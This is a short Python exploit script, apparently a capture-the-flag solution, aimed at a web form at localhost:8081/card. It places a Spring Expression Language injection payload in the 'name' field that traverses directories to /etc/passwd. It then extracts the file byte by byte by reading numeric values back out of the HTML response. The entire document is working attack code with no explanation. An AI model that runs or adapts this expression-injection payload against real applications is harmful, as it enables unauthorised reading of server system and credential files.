import requests
flagchars = []
session = requests.Session()
url = "http://localhost:8081/card"
payload = {'name': "${'bcd'.getClass().forName('org.springframework.core.io.FileSystemResourceLoader').newInstance().getResource('../../../../../../../../../../../../../etc/passwd').getContentAsByteArray().length}", 'company': "abvc", 'email': "adhcggcfiwavbhif", 'phoneNumber': "dyugyiwgifcgw"}
print(session.post(url, data=payload).text)
length = int(session.post(url, data=payload).text[259:].split("</h1>\n")[0])
print("length:", length)



for i in range(length):
    payload["name"] =  "${'bcd'.getClass().forName('org.springframework.core.io.FileSystemResourceLoader').newInstance().getResource('../../../../../../../../../../../../../etc/passwd').getContentAsByteArray()[%s]}" % i
    rq = session.post(url, data=payload)
    ch = int(rq.text[259:].split("</h1>\n")[0])
    print(chr(ch), end="")
    # flagchars.append(ch)
# print(flagchars)
# print(''.join([chr(x) for x in flagchars]))
